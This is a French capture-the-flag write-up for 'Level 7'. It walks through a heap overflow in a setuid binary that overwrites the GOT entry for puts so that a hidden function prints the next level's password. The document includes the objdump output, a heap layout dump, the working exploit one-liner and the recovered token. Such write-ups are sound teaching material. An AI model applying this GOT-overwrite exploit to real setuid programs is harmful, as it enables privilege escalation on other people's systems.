# Level 7
## Résumé
Buffer overflow sur la heap => écrase un pointeur où sera copier argv[2] => écrase `GOT` de puts => `m` => affiche token
## Préambule
```sh
$> ls -l
total 8
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
$> file level7 
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
```
Le home contient un binaire appartenant à l'user `level8` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level8/.pass`.

On récupère le fichier `level7` sur la VM pour le désassembler avec `radare2` :
```sh
$> scp -P 4242 level6@10.11.200.192:/home/user/level7/level7 .
$> r2 level7
```
![main_function_1](Ressources/main_function_1.png)
![main_function_2](Ressources/main_function_2.png)

## Analyse
### Analyse du programme
La fonction `main` alloue sur la `heap` deux zones mémoires de 8 bytes pour des structures de type `{int, char *}`. Chaque pointeur `char *` de la structure est à son tour alloué sur la heap avec une taille de 8 bytes.  
Ces structures recevrons les deux premiers arguments de la ligne de commande, chaque argument étant copiés dans le `char *` avec la fonction `strcpy`. On aura donc `{1, "arg1"}, {2, "arg2"}`. On note que la zone allouée est de 8 bytes, ce qui pose un problème de sécurité si les arguments on une taille supérieures à 8.

Ensuite le fichier `/home/user/level8/.pass` est ouvert et les 68 premiers bytes sont copiés dans un buffer `c` définit globalement dans le programme.

Pour finir, le programme affiche avec la fonction `puts` deux caractères sans importances.

On peut noter la présence de la fonction `m` :
![m_function](Ressources/m_function.png)
Cette fonction n'est pas appelée par le programme alors qu'elle affiche le buffer `c` contenant le token désiré.  
Nous devons donc appeler cette fonction à l'aide d'un dépassement de mémoire lors de la copie des arguments du programme.
### Mise en place de l'exploitation
Pour appeler la fonction `m`, nous allons modifier la `GOT` en redirigeant l'adresse de la fonction `puts` vers la fonction `m`.
Nous récupérons l'adresse dans la `GOT` qui est `0x08049928` :
```
$> objdump -R level7
level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

Pour réussir cette exploitation, nous allons profiter que les structures accueillant les arguments sont allouées à côté dans la heap et qu'elles possèdent un `char *` sur une mémoire où seront stockés ces arguments :
```
./level7 arg1 arg2
Zone mémoire :
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x31677261	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x32677261	0x00000000	0x00000000	0x00020fc1
```
Chaque ligne contient un `malloc`.  
La 1ère ligne est la première structure dont le pointeur (2ème colonne) pointe sur le malloc suivant (ligne suivante).
Nous pouvons lire les codes ascii de `arg1` dans cette 2ème ligne. Ainsi si nous écivons suffisamment loin, nous pouvons réécrire la valeur du pointeur de la 2ème structure pour le faire pointer sur la `GOT`. Le 2ème argument dans lequel nous auront mis l'adresse de la fonction `m` sera alors écrit dans la `GOT` gràce à `strcpy`.
## Application
```sh
./level7 `python -c 'print("A"*0x14+"\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
